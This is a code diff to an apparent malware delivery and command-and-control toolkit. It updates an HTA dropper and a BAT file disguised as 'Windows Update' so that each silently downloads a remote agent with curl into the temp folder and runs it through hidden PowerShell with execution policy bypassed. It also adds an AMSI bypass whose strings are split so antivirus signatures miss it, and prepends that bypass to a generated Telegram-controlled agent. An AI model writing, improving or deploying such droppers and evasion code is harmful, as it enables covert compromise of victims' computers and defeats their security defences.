@@ -52,12 +52,13 @@ _HTA_TEMPLATE = '''\
 </head>
 <script language="VBScript">
 Sub Window_OnLoad
-    Dim oWsh
-    Set oWsh = CreateObject("WScript.Shell")
-    Dim cmd
-    cmd = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command "
-    cmd = cmd & Chr(34) & "(New-Object Net.WebClient).DownloadString('{AGENT_URL}')|IEX" & Chr(34)
-    oWsh.Run cmd, 0, False
+    Dim sh, tmp, n
+    Set sh = CreateObject("WScript.Shell")
+    Randomize
+    n = CStr(Int(Rnd * 89999) + 10000)
+    tmp = sh.ExpandEnvironmentStrings("%TEMP%") & "\svc" & n & ".ps1"
+    sh.Run "cmd /c curl.exe -s -o " & Chr(34) & tmp & Chr(34) & " {AGENT_URL}", 0, True
+    sh.Run "powershell.exe -w h -nop -ep bypass -f " & Chr(34) & tmp & Chr(34), 0, False
     Self.Close
 End Sub
 </script>
@@ -74,11 +75,19 @@ End Sub
 </html>
 '''
 
+# AMSI-Bypass — Strings gesplittet damit Signaturen nicht greifen
+_AMSI_BYPASS = '''\
+$k='System';$k+='.Management.Automation';$k+='.AmsiUtils'
+$f='amsiInit';$f+='Failed'
+[Ref].Assembly.GetType($k).GetField($f,'NonPublic,Static').SetValue($null,$true)
+'''
+
 _BAT_TEMPLATE = """\
 @echo off
 title Windows Update
-powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile ^
-  -Command "(New-Object Net.WebClient).DownloadString('{AGENT_URL}') | IEX"
+set T=%TEMP%\\svc%RANDOM%.ps1
+curl.exe -s -o "%T%" {AGENT_URL}
+powershell.exe -w h -nop -ep bypass -f "%T%"
 """
 
 _LNK_BUILDER_PS1 = """\
@@ -163,7 +172,7 @@ class AutoDelivery:
             from tools.c2.c2_watcher import mark_agent_generated
             code = tg_gen(self.token, self.chat_id, self.interval)
             mark_agent_generated()
-            return code
+            return _AMSI_BYPASS + code
         except Exception:
             return None
 
